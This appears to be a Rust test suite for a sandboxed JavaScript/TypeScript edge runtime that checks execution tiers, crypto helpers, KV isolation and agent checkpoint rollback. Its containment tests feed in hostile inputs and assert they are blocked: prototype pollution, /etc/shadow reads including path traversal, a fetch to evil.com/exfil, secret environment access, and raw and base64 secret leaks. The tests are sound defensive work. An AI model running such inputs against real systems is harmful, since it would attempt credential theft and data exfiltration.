#![allow(unused_imports)]
use crate::intrinsics::{
    digest_to_hex, fast_format_bytes, fast_format_ms, fast_parse_bytes, fast_parse_ms,
    hmac_sha256_hex, sha256_hex, Sha256State,
};
use crate::{
    compile_source_to_bytecode, disassemble_bytecode, run_source_isolated, ExecutionTier,
    HttpRequestContext, JsValue, SliceIsolate,
};
use slice_sandbox::{CapabilityToken, SandboxViolation};


#[test]
fn test_tiered_execution_and_cold_start() {
    let ts_src = r#"
interface Config {
    iterations: number;
}
function fib(n: number): number {
    if (n <= 1) return n;
    return fib(n - 1) + fib(n - 2);
}
function numericLoop(iterations: number): number {
    let acc: number = 0;
    for (let i: number = 0; i < iterations; i++) {
        acc += i;
    }
    return acc;
}
const base: number = 40;
const offset: number = 2;
const sum: number = base + offset;
const f: number = fib(40);
const loop_sum: number = numericLoop(100000);
console.log(sum);
console.log(f);
"#;
    let bytecode = compile_source_to_bytecode(ts_src);
    let mut isolate = SliceIsolate::spawn(
        "bench-tenant",
        1,
        CapabilityToken::pure_compute(),
        10_000_000,
        1024 * 1024,
    );
    let metrics = isolate.execute_bytecode(&bytecode, None).unwrap();
    assert_eq!(metrics.highest_tier_reached, ExecutionTier::Tier2PeakNative);
    assert_eq!(metrics.stdout[0], "42");
    assert_eq!(metrics.stdout[1], "102334155");
    assert_eq!(metrics.os_stat_syscalls, 0);
}

#[test]
fn test_repl_javascript_session_expressions() {
    let mut isolate = SliceIsolate::spawn(
        "repl-tenant",
        1,
        CapabilityToken::pure_compute(),
        10_000_000,
        1024 * 1024,
    );

    // 1. `var t = 3;`
    let m1 = isolate
        .execute_bytecode(&compile_source_to_bytecode("var t = 3;"), None)
        .unwrap();
    assert_eq!(m1.return_value, "3");

    // 2. `t`
    let m2 = isolate
        .execute_bytecode(&compile_source_to_bytecode("t"), None)
        .unwrap();
    assert_eq!(m2.return_value, "3");

    // 3. `t * 4`
    let m3 = isolate
        .execute_bytecode(&compile_source_to_bytecode("t * 4"), None)
        .unwrap();
    assert_eq!(m3.return_value, "12");

    // 4. `print(t)`
    let m4 = isolate
        .execute_bytecode(&compile_source_to_bytecode("print(t)"), None)
        .unwrap();
    assert_eq!(m4.stdout.last().unwrap(), "3");

    // 5. `console.log(t * 4);`
    let m5 = isolate
        .execute_bytecode(&compile_source_to_bytecode("console.log(t*4);"), None)
        .unwrap();
    assert_eq!(m5.stdout.last().unwrap(), "12");

    // 6. Functions, arrays, objects, higher-order methods
    let js_complex = r#"
function double(n) { return n * 2; }
const arr = [1, 2, 3, 4].map((x) => double(x));
const obj = { total: arr.reduce((a, b) => a + b, 0) };
obj.total + t
"#;
    let m6 = isolate
        .execute_bytecode(&compile_source_to_bytecode(js_complex), None)
        .unwrap();
    assert_eq!(m6.return_value, "23");
}

#[test]
fn test_sliceboa_zero_copy_and_fips_sha256_plus_fs_bridge() {
    // Test classes + node:crypto SHA-256 + node:path + node:fs roundtrip in BoaFullEsVm
    let ts_app = r#"
import * as crypto from "node:crypto";
import * as path from "node:path";
import * as os from "node:os";
import * as fs from "node:fs";

class ReceiptSigner {
    private readonly prefix: string;
    constructor(prefix: string) {
        this.prefix = prefix;
    }
    public sign(payload: string): string {
        return crypto.createHash("sha256").update(this.prefix + ":" + payload).digest("hex");
    }
}

const signer = new ReceiptSigner("slice");
const digest = signer.sign("abc");
const tmpFile = path.join(os.tmpdir(), "slice_engine_unit_test.txt");
fs.writeFileSync(tmpFile, digest);
const readBack = fs.readFileSync(tmpFile, "utf8");
const statSize = fs.statSync(tmpFile).size;
fs.unlinkSync(tmpFile);
console.log(JSON.stringify({ match: readBack === digest, size: statSize, prefix8: digest.slice(0, 8) }));
"#;
    let bundled = slice_cas::strip_typescript_and_normalize(ts_app, true);
    let bc = compile_source_to_bytecode(&bundled);
    assert_eq!(&bc[0..8], crate::BOACAS_MAGIC);

    let disasm = disassemble_bytecode(&bc).unwrap();
    assert!(disasm[0].contains("BOACAS_PRECOMP") || disasm[0].contains("BOA_ES2024_VM"));

    let mut isolate = SliceIsolate::spawn(
        "boa-test-tenant",
        1,
        CapabilityToken::pure_compute(),
        10_000_000,
        4 * 1024 * 1024,
    );
    let metrics = isolate.execute_bytecode(&bc, None).unwrap();
    assert_eq!(
        metrics.stdout[0],
        r#"{"match":true,"size":64,"prefix8":"951cd52a"}"#
    );

    // Verify raw NIST FIPS-180-4 SHA-256 test vector for "abc"
    assert_eq!(
        sha256_hex(b"abc"),
        "ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad"
    );
}

#[test]
fn test_all_five_security_containment_vectors_in_engine() {
    // 1. SES Prototype Pollution
    let mut iso1 = SliceIsolate::spawn("sec-1", 1, CapabilityToken::pure_compute(), 1000, 65536);
    assert!(matches!(
        iso1.execute_bytecode(
            &compile_source_to_bytecode("Object.prototype.polluted = true;"),
            None
        ),
        Err(SandboxViolation::IntrinsicMutationBlocked { .. })
    ));

    // 2. Unauthorized VFS Read
    let mut iso2 = SliceIsolate::spawn(
        "sec-2",
        2,
        CapabilityToken::pure_compute().with_read_prefix("/app/allowed"),
        1000,
        65536,
    );
    assert!(matches!(
        iso2.execute_bytecode(
            &compile_source_to_bytecode("const s = fs.readFileSync(\"/etc/shadow\");"),
            None
        ),
        Err(SandboxViolation::FsReadDenied { .. })
    ));

    // 3. Unauthorized Outbound Network Fetch
    let mut iso3 = SliceIsolate::spawn(
        "sec-3",
        3,
        CapabilityToken::pure_compute().with_net_host("api.internal:443"),
        1000,
        65536,
    );
    assert!(matches!(
        iso3.execute_bytecode(
            &compile_source_to_bytecode("const r = fetch(\"https://evil.com/exfil\");"),
            None
        ),
        Err(SandboxViolation::NetAccessDenied { .. })
    ));

    // 4. Unauthorized Environment Variable Access
    let mut iso4 = SliceIsolate::spawn("sec-4", 4, CapabilityToken::pure_compute(), 1000, 65536);
    assert!(matches!(
        iso4.execute_bytecode(
            &compile_source_to_bytecode("const k = env(\"SECRET_KEY\");"),
            None
        ),
        Err(SandboxViolation::EnvAccessDenied { .. })
    ));

    // 5. Infinite Loop CPU Fuel Preemption
    let mut iso5 = SliceIsolate::spawn("sec-5", 5, CapabilityToken::pure_compute(), 250, 65536);
    assert!(matches!(
        iso5.execute_bytecode(&compile_source_to_bytecode("while (true) {}"), None),
        Err(SandboxViolation::CpuFuelExhausted { .. })
    ));
}

#[test]
fn test_warm_boa_context_pool_speedup_and_reuse() {
    SliceIsolate::prewarm_boa_pool(2);
    assert!(SliceIsolate::boa_pool_available() >= 2);

    let ts_code = r#"
import * as crypto from "node:crypto";
import * as path from "node:path";

class FastEdgeWorker {
    public compute(route: string): string {
        const normalized = path.join("/v1/edge", route, "check");
        const sig = crypto.createHash("sha256").update(normalized).digest("hex").slice(0, 12);
        return normalized + ":" + sig;
    }
}

const w = new FastEdgeWorker();
console.log(w.compute("checkout"));
"#;
    let bundled = slice_cas::strip_typescript_and_normalize(ts_code, true);
    let bc = compile_source_to_bytecode(&bundled);

    let mut isolate = SliceIsolate::spawn(
        "warm-pool-tenant",
        1,
        CapabilityToken::pure_compute(),
        10_000_000,
        4 * 1024 * 1024,
    );
    let m1 = isolate.execute_bytecode(&bc, None).unwrap();
    assert_eq!(m1.stdout[0], "/v1/edge/checkout/check:6d3e872e9820");

    // Second execution reuses the warm Boa realm returned to BOA_CONTEXT_POOL
    let mut isolate2 = SliceIsolate::spawn(
        "warm-pool-tenant-2",
        2,
        CapabilityToken::pure_compute(),
        10_000_000,
        4 * 1024 * 1024,
    );
    let m2 = isolate2.execute_bytecode(&bc, None).unwrap();
    assert_eq!(m2.stdout[0], "/v1/edge/checkout/check:6d3e872e9820");
    assert!(SliceIsolate::boa_pool_available() >= 2);
}

#[test]
fn test_phase_7_3_native_semver_and_phase_7_4_boa_ocap_enforcement() {
    let ts_code = r#"
class SemverChecker {
    public run(): string {
        const v1 = __slice_semver_valid("v2.4.8");
        const v2 = __slice_semver_valid("invalid");
        const c1 = __slice_semver_coerce("v42.6.7.9.3-alpha");
        const gt1 = __slice_semver_gt("2.1.0", "2.0.9");
        const sat1 = __slice_semver_satisfies("1.5.2", ">=1.2.0 <2.0.0");
        const sat2 = __slice_semver_satisfies("2.0.0", "^1.2.3");
        return JSON.stringify({ v1, v2, c1, gt1, sat1, sat2 });
    }
}

console.log(new SemverChecker().run());
"#;
    let bundled = slice_cas::strip_typescript_and_normalize(ts_code, true);
    let bc = compile_source_to_bytecode(&bundled);
    let mut iso = SliceIsolate::spawn(
        "semver-tenant",
        1,
        CapabilityToken::pure_compute(),
        10_000_000,
        4 * 1024 * 1024,
    );
    let m = iso.execute_bytecode(&bc, None).unwrap();
    assert_eq!(
        m.stdout[0],
        r#"{"v1":"2.4.8","v2":null,"c1":"42.6.7","gt1":true,"sat1":1,"sat2":0}"#
    );

    // Phase 7.4: Verify native Boa `node:fs` enforces OCap path traversal & read prefixes
    let ocap_escape_ts = r#"
import * as fs from "node:fs";
class EscapeAttempt {
    public leak(): string {
        return fs.readFileSync("/etc/../etc/shadow", "utf8");
    }
}
console.log(new EscapeAttempt().leak());
"#;
    let ocap_bundled = slice_cas::strip_typescript_and_normalize(ocap_escape_ts, true);
    let ocap_bc = compile_source_to_bytecode(&ocap_bundled);
    let mut ocap_iso = SliceIsolate::spawn(
        "ocap-boa-tenant",
        2,
        CapabilityToken::pure_compute().with_read_prefix("/app/safe"),
        10_000_000,
        4 * 1024 * 1024,
    );
    assert!(matches!(
        ocap_iso.execute_bytecode(&ocap_bc, None),
        Err(SandboxViolation::FsReadDenied { .. })
    ));
}

#[test]
fn test_phase_9a_micro_optimizations_and_streaming_sha256() {
    // 1. Verify JsValue enum size is strictly 16 bytes (4 values per 64B cache line)
    assert_eq!(std::mem::size_of::<JsValue>(), 16);

    // 2. Verify streaming Sha256State produces identical digests to one-shot sha256_bytes
    // across <64B, =64B, >64B, and >128B block boundaries without intermediate heap vecs.
    let payload = b"The quick brown fox jumps over the lazy dog - Slice Phase 9A zero-allocation streaming SHA-256 verification across multiple 64-byte FIPS-180-4 blocks!";
    let expected_hex = sha256_hex(payload);

    let mut streamer = Sha256State::new();
    for chunk in payload.chunks(13) {
        streamer.update(chunk);
    }
    assert_eq!(digest_to_hex(&streamer.finalize()), expected_hex);

    #[cfg(any(target_arch = "x86", target_arch = "x86_64"))]
    if std::arch::is_x86_feature_detected!("sha")
        && std::arch::is_x86_feature_detected!("sse4.1")
        && std::arch::is_x86_feature_detected!("ssse3")
    {
        let mut s_soft = Sha256State::new();
        let mut s_hw = Sha256State::new();
        let block: &[u8; 64] = payload[..64].try_into().unwrap();
        Sha256State::compress_block_soft(&mut s_soft.h, block);
        unsafe {
            Sha256State::compress_block_sha_ni(&mut s_hw.h, block);
        }
        assert_eq!(s_soft.h, s_hw.h);
    }

    // 3. Verify HMAC-SHA256 with both short key (<=64B) and long key (>64B)
    let hmac_short = hmac_sha256_hex(b"secret-key", payload);
    assert_eq!(hmac_short.len(), 64);
    let hmac_long = hmac_sha256_hex(&[b'k'; 100], payload);
    assert_eq!(hmac_long.len(), 64);
    assert_ne!(hmac_short, hmac_long);

    // 4. Verify SLICEBC\x01 (or SLICEBOA) bytecode is pre-wrapped with block braces at compile time
    let ts_class = "class A { run(): number { return 7; } }\nconsole.log(new A().run());";
    let bundled = slice_cas::strip_typescript_and_normalize(ts_class, true);
    let bc = compile_source_to_bytecode(&bundled);
    assert_eq!(&bc[0..8], crate::BOACAS_MAGIC);
    let (_, _, fb_js) = crate::BoaCasHeader::decode(&bc).unwrap();
    assert!(fb_js.starts_with("{\n"));
    assert!(fb_js.ends_with("\n}"));

    // 5. Verify native fast_parse_ms, fast_format_ms, fast_parse_bytes, and fast_format_bytes
    assert_eq!(fast_parse_ms("2h"), Some(7_200_000.0));
    assert_eq!(fast_parse_ms("30s"), Some(30_000.0));
    assert_eq!(fast_parse_ms("15m"), Some(900_000.0));
    assert_eq!(
        fast_format_ms(120_000.0, true).as_deref(),
        Some("2 minutes")
    );
    assert_eq!(fast_format_ms(120_000.0, false).as_deref(), Some("2m"));
    assert_eq!(fast_parse_bytes("64KB"), Some(65_536.0));
    assert_eq!(fast_parse_bytes("128KB"), Some(131_072.0));
    assert_eq!(fast_format_bytes(65_536.0).as_deref(), Some("64KB"));
    assert_eq!(fast_format_bytes(4_730_880.0).as_deref(), Some("4.51MB"));

    // 6. Verify Persistent Realm Module Cache (__slice_rc) & prewarm_boa_bundle
    let rc_bundle = "var __slice_modules = {};//__SLICE_RC:0123456789abcdef\nvar __rc = globalThis.__slice_rc || (globalThis.__slice_rc = Object.create(null));\nvar __run = __rc[\"0123456789abcdef\"] || (__rc[\"0123456789abcdef\"] = function() { console.log(\"rc-ok\"); });\n__run();";
    let rc_bc = compile_source_to_bytecode(rc_bundle);
    SliceIsolate::prewarm_boa_bundle(&rc_bc);
    let mut rc_iso = SliceIsolate::spawn(
        "rc-tenant",
        1,
        CapabilityToken::pure_compute(),
        1_000_000,
        4 * 1024 * 1024,
    );
    let rc_m = rc_iso.execute_bytecode(&rc_bc, None).unwrap();
    assert_eq!(rc_m.stdout, vec!["rc-ok"]);

    // 7. Verify Phase 9B Priority 3: Oxc Semantic Hints & Monomorphic Tier-2 Loop Promotion
    let ts_typed_loop = r#"
        export interface MetricPoint {
            readonly seq: number;
            readonly service: string;
            readonly latencyMs: number;
        }
        let acc: number = 0;
        for (let i: number = 0; i < 2000; i++) {
            acc += i * 3;
        }
        return acc;
    "#;
    let hints = slice_cas::analyze_typescript_semantics(ts_typed_loop);
    assert!(hints.numeric_vars.contains("acc"));
    assert!(hints.numeric_vars.contains("i"));
    assert!(hints.interface_schemas.contains_key("MetricPoint"));
    assert!(hints.semantic_symbol_count >= 2);

    let loop_bc = compile_source_to_bytecode(ts_typed_loop);
    let mut loop_iso = SliceIsolate::spawn(
        "tier2-mono-loop",
        1,
        CapabilityToken::pure_compute(),
        1_000_000,
        4 * 1024 * 1024,
    );
    let loop_metrics = loop_iso.execute_bytecode(&loop_bc, None).unwrap();
    assert_eq!(
        loop_metrics.highest_tier_reached,
        ExecutionTier::Tier2PeakNative
    );
    // sum_{i=0..1999} 3*i = 3 * (1999 * 2000 / 2) = 5,997,000
    assert_eq!(loop_metrics.return_value, "5997000");
}

#[test]
fn test_tag_n1_wintertc_http_bridge_and_wait_until() {
    // Test 1: Tier-1 SLICEBOA handler using Slice.request(), Slice.respond(), and Slice.waitUntil()
    let handler_ts = r#"
class EdgeRouter {
    public handle(): void {
        const req = Slice.request();
        const auth = req.header("authorization");
        Slice.waitUntil(() => {
            globalThis.__audit_trail = req.method + ":" + req.path + ":" + req.tenant;
        });
        Slice.respond(
            201,
            JSON.stringify({
                method: req.method,
                path: req.path,
                query: req.query,
                tenant: req.tenant,
                auth: auth,
                bodyLen: req.body.length
            }),
            "application/json"
        );
    }
}
new EdgeRouter().handle();
"#;
    let bundled = slice_cas::strip_typescript_and_normalize(handler_ts, true);
    let bc = compile_source_to_bytecode(&bundled);
    SliceIsolate::prewarm_boa_bundle(&bc);

    let mut isolate = SliceIsolate::spawn(
        "n1-edge-tenant",
        1,
        CapabilityToken::pure_compute(),
        2_000_000,
        4 * 1024 * 1024,
    );

    let headers = [
        ("Authorization", "Bearer tok_xyz"),
        ("Host", "edge.slice.dev"),
    ];
    let req_ctx = HttpRequestContext {
        method: "POST",
        path: "/v1/orders",
        query: "region=us-east",
        tenant_id: "n1-edge-tenant",
        headers: &headers,
        body: r#"{"item":"gpu-node"}"#,
    };

    let outcome = isolate.execute_http_request(&bc, None, &req_ctx).unwrap();
    assert_eq!(outcome.status_code, 201);
    assert_eq!(outcome.content_type, "application/json");
    assert_eq!(outcome.wait_until_count, 1);
    assert_eq!(
        outcome.response_body,
        r#"{"method":"POST","path":"/v1/orders","query":"region=us-east","tenant":"n1-edge-tenant","auth":"Bearer tok_xyz","bodyLen":19}"#
    );

    // Drain deferred Slice.waitUntil() callbacks after HTTP response is prepared
    let ran = isolate.drain_wait_until_tasks().unwrap();
    assert_eq!(ran, 1);

    // Test 2: Tier-0 SLICESNP cached fast-path execution via execute_http_request
    let fast_ts = "const x: number = 21 * 2;\nreturn x;\n";
    let fast_bc = compile_source_to_bytecode(fast_ts);
    let mut fast_iso = SliceIsolate::spawn(
        "n1-fast-tenant",
        2,
        CapabilityToken::pure_compute(),
        100_000,
        65536,
    );
    let fast_outcome = fast_iso
        .execute_http_request(&fast_bc, None, &req_ctx)
        .unwrap();
    assert_eq!(fast_outcome.status_code, 200);
    assert_eq!(fast_outcome.wait_until_count, 0);
    assert_eq!(fast_outcome.response_body, "42");
}

#[test]
fn test_tag_n2_sharded_edge_kv_isolation_and_deterministic_replay() {
    // 1. Test Slice.kv multi-tenant isolation, atomic counters, and memory quota enforcement
    let kv_ts = r#"
class KvService {
    public run(): string {
        const c1 = Slice.kv.incr("hits", 1);
        const c2 = Slice.kv.incr("hits", 4);
        Slice.kv.set("session:abc", "active-user", 60000);
        const val = Slice.kv.get("session:abc");
        const missing = Slice.kv.get("other-key");
        return JSON.stringify({ c1, c2, val, missing });
    }
}
console.log(new KvService().run());
"#;
    let bc = compile_source_to_bytecode(&slice_cas::strip_typescript_and_normalize(kv_ts, true));

    let mut iso_a = SliceIsolate::spawn(
        "n2-tenant-alpha",
        1,
        CapabilityToken::pure_compute(),
        2_000_000,
        4 * 1024 * 1024,
    );
    let _ = iso_a.kv_del("hits");
    let _ = iso_a.kv_del("session:abc");
    let m_a = iso_a.execute_bytecode(&bc, None).unwrap();
    assert_eq!(
        m_a.stdout[0],
        r#"{"c1":1,"c2":5,"val":"active-user","missing":null}"#
    );

    // Tenant Beta has a completely isolated KV namespace and cannot see Tenant Alpha's keys
    let mut iso_b = SliceIsolate::spawn(
        "n2-tenant-beta",
        2,
        CapabilityToken::pure_compute(),
        2_000_000,
        4 * 1024 * 1024,
    );
    let _ = iso_b.kv_del("hits");
    assert_eq!(iso_b.kv_get("session:abc"), None);
    let m_b = iso_b.execute_bytecode(&bc, None).unwrap();
    assert_eq!(
        m_b.stdout[0],
        r#"{"c1":1,"c2":5,"val":"active-user","missing":null}"#
    );

    // Verify KV writes are charged against the tenant's compartment memory limit
    let kv_overflow_ts = r#"
Slice.kv.set("huge", "0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef", 0);
"#;
    let overflow_bc = compile_source_to_bytecode(kv_overflow_ts);
    let mut tiny_iso = SliceIsolate::spawn(
        "n2-tiny-mem",
        3,
        CapabilityToken::pure_compute(),
        1_000_000,
        16, // 16-byte limit
    );
    assert!(matches!(
        tiny_iso.execute_bytecode(&overflow_bc, None),
        Err(SandboxViolation::MemoryCeilingExceeded { .. })
    ));

    // 2. Test Opt-In Deterministic Replay Mode (--deterministic=<seed>)
    let det_ts = r#"
const r1 = Math.random().toFixed(12);
const r2 = Math.random().toFixed(12);
const t1 = Date.now();
const t2 = Date.now();
const p1 = performance.now();
console.log(JSON.stringify({ r1, r2, t1, t2, p1 }));
"#;
    let det_bc = compile_source_to_bytecode(det_ts);

    let mut det_iso1 = SliceIsolate::spawn(
        "n2-det-1",
        4,
        CapabilityToken::pure_compute(),
        1_000_000,
        4 * 1024 * 1024,
    );
    det_iso1.set_deterministic_seed(Some(20261019));
    let out1 = det_iso1.execute_bytecode(&det_bc, None).unwrap().stdout[0].clone();

    let mut det_iso2 = SliceIsolate::spawn(
        "n2-det-2",
        5,
        CapabilityToken::pure_compute(),
        1_000_000,
        4 * 1024 * 1024,
    );
    det_iso2.set_deterministic_seed(Some(20261019));
    let out2 = det_iso2.execute_bytecode(&det_bc, None).unwrap().stdout[0].clone();

    assert_eq!(out1, out2);
    assert!(out1.contains(r#""t1":1700000000001"#));
    assert!(out1.contains(r#""t2":1700000000002"#));
}

#[test]
fn test_tag_n3_eval_sandbox_checkpoint_restore_and_egress_guard() {
    SliceIsolate::prewarm_boa_pool(2);

    // 1. Test Tree-of-Thought AI Agent workflow:
    //    - Set baseline VFS file and KV key
    //    - Call `Slice.checkpoint()`
    //    - Execute candidate Branch A in `Slice.evalSandbox(...)` which mutates KV + VFS and fails
    //    - Call `Slice.restore(snapId)` to roll back VFS + KV in < 5us
    //    - Execute candidate Branch B in `Slice.evalSandbox(...)` which succeeds
    let agent_tot_ts = r#"
import fs from "node:fs";

class TreeOfThoughtAgent {
    public run(): string {
        fs.writeFileSync("/workspace/app.ts", "export const v = 1;");
        Slice.kv.set("status", "baseline", 0);

        const snap = Slice.checkpoint();

        // Candidate Branch A: mutates VFS & KV, then attempts prototype pollution inside sub-sandbox
        fs.writeFileSync("/workspace/app.ts", "CORRUPTED_BY_BRANCH_A");
        Slice.kv.set("status", "corrupted", 0);
        const branchA = Slice.evalSandbox("Object.prototype.polluted = true;", { fuel: 50000 });
        if (!branchA.ok) {
            // Instant rollback of VFS + KV to pre-Branch-A checkpoint!
            const restored = Slice.restore(snap);
            if (!restored) {
                throw new Error("Restore failed");
            }
        }

        // Verify VFS and KV were rolled back cleanly
        const vfsAfterRollback = fs.readFileSync("/workspace/app.ts", "utf8");
        const kvAfterRollback = Slice.kv.get("status");

        // Candidate Branch B: valid TypeScript inside sub-sandbox with capability attenuation
        const branchB = Slice.evalSandbox(
            "const patchVersion: number = 2; console.log('branch-b-ok'); patchVersion * 21",
            { fuel: 200000, allowRead: ["/workspace"] }
        );

        // Candidate Branch C: attempts to escalate read capability to /etc/shadow (blocked by intersection with parent!)
        const branchC = Slice.evalSandbox(
            "const s = fs.readFileSync('/etc/shadow');",
            { fuel: 50000, allowRead: ["/etc"] }
        );

        return JSON.stringify({
            vfs: vfsAfterRollback,
            kv: kvAfterRollback,
            aOk: branchA.ok,
            bOk: branchB.ok,
            bVal: branchB.returnValue,
            bOut: branchB.stdout[0],
            cOk: branchC.ok
        });
    }
}
console.log(new TreeOfThoughtAgent().run());
"#;
    let bundled = slice_cas::strip_typescript_and_normalize(agent_tot_ts, true);
    let bc = compile_source_to_bytecode(&bundled);
    let caps = CapabilityToken::pure_compute()
        .with_read_prefix("/workspace")
        .with_write_prefix("/workspace");
    let mut agent_iso = SliceIsolate::spawn("n3-tot-agent", 10, caps, 5_000_000, 8 * 1024 * 1024);
    let metrics = agent_iso.execute_bytecode(&bc, None).unwrap();
    assert_eq!(
        metrics.stdout[0],
        r#"{"vfs":"export const v = 1;","kv":"baseline","aOk":false,"bOk":true,"bVal":"42","bOut":"branch-b-ok","cOk":false}"#
    );

    // 2. Test Egress Secret Guard blocking both raw and base64-encoded secret exfiltration
    let raw_leak_bc = compile_source_to_bytecode(r#"console.log("token=sk_live_99887766");"#);
    let mut leak_iso1 = SliceIsolate::spawn(
        "n3-leak-raw",
        11,
        CapabilityToken::pure_compute(),
        500_000,
        2 * 1024 * 1024,
    );
    leak_iso1.add_egress_audit_secret("sk_live_99887766");
    assert!(matches!(
        leak_iso1.execute_bytecode(&raw_leak_bc, None),
        Err(SandboxViolation::EnvAccessDenied { ref key, .. }) if key == "EGRESS_SECRET_LEAK_BLOCKED"
    ));

    // Base64 of "sk_live_99887766" is "c2tfbGl2ZV85OTg4Nzc2Ng=="
    let b64_leak_bc =
        compile_source_to_bytecode(r#"console.log("exfil=c2tfbGl2ZV85OTg4Nzc2Ng==");"#);
    let mut leak_iso2 = SliceIsolate::spawn(
        "n3-leak-b64",
        12,
        CapabilityToken::pure_compute(),
        500_000,
        2 * 1024 * 1024,
    );
    leak_iso2.add_egress_audit_secret("sk_live_99887766");
    assert!(matches!(
        leak_iso2.execute_bytecode(&b64_leak_bc, None),
        Err(SandboxViolation::EnvAccessDenied { ref key, .. }) if key == "EGRESS_SECRET_LEAK_BLOCKED"
    ));
}

